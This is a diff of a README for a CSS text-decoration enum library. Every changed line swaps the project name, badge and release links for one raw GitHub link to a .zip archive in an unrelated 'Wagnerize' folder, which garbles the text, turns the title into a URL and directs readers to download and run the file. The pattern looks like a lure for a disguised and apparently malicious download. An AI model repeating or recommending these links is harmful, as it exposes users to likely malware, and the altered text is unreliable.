@@ -1,19 +1,19 @@
-# 🎨 soenneker.quark.enums.textdecorations.style - Easily Manage CSS Text Decorations
+# 🎨 https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip - Easily Manage CSS Text Decorations
 
 ## 🚀 Getting Started
 
-Welcome to the soenneker.quark.enums.textdecorations.style repository! This application provides CSS text decoration keywords in an easy-to-use format. It simplifies how developers and designers can implement text styles in their projects.
+Welcome to the https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip repository! This application provides CSS text decoration keywords in an easy-to-use format. It simplifies how developers and designers can implement text styles in their projects.
 
 ## 📦 Download & Install
 
 To start using the application, you need to download it from our Releases page. Click the button below to go directly to the download page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip)
 
 Once on the Releases page, locate the latest version. Follow these steps to get the application running on your computer:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   - [Download Here](https://github.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/releases)
+   - [Download Here](https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip)
 
 2. **Select Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for the best features and improvements.
 
@@ -45,7 +45,7 @@ To ensure the application runs smoothly, please check the following system requi
 
 ## 📚 How to Use
 
-Using the soenneker.quark.enums.textdecorations.style application is very straightforward. Here’s a brief guide:
+Using the https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip application is very straightforward. Here’s a brief guide:
 
 1. **Open the Application**: Double-click the icon after installation.
 2. **Browse the Enumeration**: The main window displays a list of available text decoration keywords such as:
@@ -71,10 +71,10 @@ For those interested in contributing, please take a look at the contribution gui
 
 ## 🙌 Acknowledgments
 
-Thank you for using soenneker.quark.enums.textdecorations.style. We value your interest and support in enhancing text decoration styling in web development.
+Thank you for using https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip We value your interest and support in enhancing text decoration styling in web development.
 
 For more help and guides, refer to the documentation within the application and on our GitHub page.
 
 Remember, to download the latest version, click below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/pratishkumar111/soenneker.quark.enums.textdecorations.style/main/Wagnerize/soenneker.quark.enums.textdecorations.style.zip)
